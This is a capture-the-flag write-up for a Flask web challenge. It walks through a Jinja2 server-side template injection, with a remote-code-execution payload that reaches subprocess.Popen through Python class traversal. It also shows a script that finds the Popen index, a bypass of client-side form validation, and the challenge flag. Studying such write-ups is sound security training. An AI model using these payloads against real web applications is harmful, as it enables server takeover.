# Web: She Sells Sea Shells
Author: [redtrib3](https://github.com/redtrib3)

<br>
**Points**: 600
**Hint:** `{{ 7*7 }}`

**Challenge description:**
```
I just bought a flask at discount from this e-commerce website, check it out. 

http://glitchctf.games:64300/

```

**Vulnerability**: Server side Template Injection (Jinja)

**Vulnerable endpoints:** 
	-> `/search?q={{payload}}`	
	-> `/register (username input is vulnerable)`

## Exploitation:

### <u>Method 1  (Easy/Medium)</u>:

GET parameter 'q' in endpoint `/search` is vulnerable to Jinja2 SSTI. 
No blacklist/filter is added, so any SSTI payload works!

#### RCE payload: 
```
{{''.__class__.__base__.__subclasses__()[<index>]('cat flag', shell=True, stdout=-1).communicate()}} 
```

How to find the index:
     
```
//step1: dumps all subclasses 
{{''.__class__.__base__.__subclasses__()}}

 output: 
 
 No results for '[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>
 ...[SNIP]....
 <class 'sqlite3.Row'>, <class 'sqlite3.Cursor'>, <class 'sqlite3.Connection'>, <class 'sqlite3.Statement'>, <class 'sqlite3.PrepareProtocol'>, <class 'sqlite3.Blob'>]
```
```python
//using a python program to find the index of subprocess.Popen:

cls = '''paste the above result as a string'''
# prints the index for subprocess.Popen
print([i for i,j in enumerate(cls.split(",")) if "subprocess.Popen" in j]) 

```

### <u>Method 2 (Medium/Hard) :</u>

* Register as {{7*7}}, Client side prevents submission of usernames that is not an email. 

```html
<input type="email" class="form-control" id="email" name="username" required="">
```  
Bypass this by Removing Type attribute or change it to "text".

* After registering and login, visit `/profile`, The reflected username shows executed code (49). Use the sink to exploit like method 1.

#### flag:
```plaintext
GLITCH{dund3r_b1und3r_5cd1e}
```
